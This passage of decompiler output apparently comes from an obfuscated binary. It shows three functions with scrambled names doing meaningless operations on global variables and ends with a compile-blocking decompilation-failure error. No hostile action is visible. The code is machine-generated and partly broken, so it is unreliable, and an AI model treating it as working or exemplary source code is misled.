// 407C3F: using guessed type void *off_407C3F;

//----- (00406E93) --------------------------------------------------------
unsigned int __userpurge km_gSHWw@<eax>(unsigned int result@<eax>, char *a2)
{
  unsigned int v2; // [esp+4h] [ebp-20h]

  *off_407C0B[0] &= dword_407A11;
  dword_4079E1 |= *(_DWORD *)off_407C3F;
  Rect.top = (__PAIR64__(LOBYTE(Rect.top), v2) - __PAIR64__(*(_DWORD *)off_407B8B, result)) >> 32;
  return result;
}
// 406ECB: variable 'v2' is possibly undefined
// 4079E1: using guessed type int dword_4079E1;
// 407A11: using guessed type int dword_407A11;
// 407B8B: using guessed type void *off_407B8B;
// 407C0B: using guessed type int *off_407C0B[9];
// 407C3F: using guessed type void *off_407C3F;

//----- (00406ED7) --------------------------------------------------------
void __stdcall NP_O_BkgxXNMr__(unsigned int a1, __int16 a2)
{
  *off_407C1B[0] += (unsigned __int8)dword_4079A1;
  *off_407BBF[0] ^= (unsigned __int8)dword_4079F5;
  *off_407C3B |= LOBYTE(rcDst.right);
}
// 4079A1: using guessed type int dword_4079A1;
// 4079F5: using guessed type int dword_4079F5;
// 407BBF: using guessed type int *off_407BBF[11];
// 407C1B: using guessed type int *off_407C1B[5];
// 407C3B: using guessed type int *off_407C3B;

//----- (00406F10) --------------------------------------------------------
void __userpurge _Cxmehk_(unsigned int a1@<ebx>, unsigned __int16 a2, int a3)
{
  int v3; // [esp+0h] [ebp-28h] BYREF

  dword_4079F1 += *(_DWORD *)off_407C3F + (a1 < (unsigned int)&v3);
  rcDst.top |= *off_407BC7[0];
  dword_407979 -= dword_407961;
}
// 407961: using guessed type int dword_407961;
// 407979: using guessed type int dword_407979;
// 4079F1: using guessed type int dword_4079F1;
// 407BC7: using guessed type int *off_407BC7[9];
// 407C3F: using guessed type void *off_407C3F;

// nfuncs=40 queued=39 decompiled=39 lumina nreq=0 worse=0 better=0
#error "There were 1 decompilation failure(s) on 39 function(s)"
